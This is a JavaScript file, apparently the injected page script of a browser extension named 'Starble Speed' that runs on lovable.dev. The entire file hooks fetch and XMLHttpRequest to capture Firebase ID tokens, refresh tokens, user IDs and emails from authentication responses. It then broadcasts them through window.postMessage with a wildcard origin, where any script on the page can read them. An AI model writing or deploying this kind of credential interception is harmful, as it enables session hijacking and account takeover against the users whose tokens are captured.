// Starble Speed — injected.js
// Runs in page context on lovable.dev to intercept Firebase tokens
'use strict';

(function() {
  // Intercept fetch calls to Firebase token endpoint
  const origFetch = window.fetch;
  window.fetch = function(...args) {
    const url = typeof args[0] === 'string' ? args[0] : args[0]?.url || '';
    
    return origFetch.apply(this, args).then(async (response) => {
      try {
        // Intercept Firebase token refresh responses
        if (url.includes('securetoken.googleapis.com') || url.includes('identitytoolkit.googleapis.com')) {
          const clone = response.clone();
          const data = await clone.json().catch(() => null);
          if (data && (data.idToken || data.id_token)) {
            window.postMessage({
              __clf_lovable_token_captured: true,
              idToken: data.idToken || data.id_token,
              refreshToken: data.refreshToken || data.refresh_token || null,
              uid: data.localId || data.user_id || null,
              email: data.email || null,
            }, '*');
          }
        }
      } catch (_) {}
      return response;
    });
  };

  // Also intercept XMLHttpRequest for older Firebase SDK paths
  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;
  
  XMLHttpRequest.prototype.open = function(method, url) {
    this._clf_url = url;
    return origOpen.apply(this, arguments);
  };
  
  XMLHttpRequest.prototype.send = function() {
    if (this._clf_url && (this._clf_url.includes('securetoken.googleapis.com') || this._clf_url.includes('identitytoolkit.googleapis.com'))) {
      this.addEventListener('load', function() {
        try {
          const data = JSON.parse(this.responseText);
          if (data && (data.idToken || data.id_token)) {
            window.postMessage({
              __clf_lovable_token_captured: true,
              idToken: data.idToken || data.id_token,
              refreshToken: data.refreshToken || data.refresh_token || null,
              uid: data.localId || data.user_id || null,
              email: data.email || null,
            }, '*');
          }
        } catch (_) {}
      });
    }
    return origSend.apply(this, arguments);
  };
})();
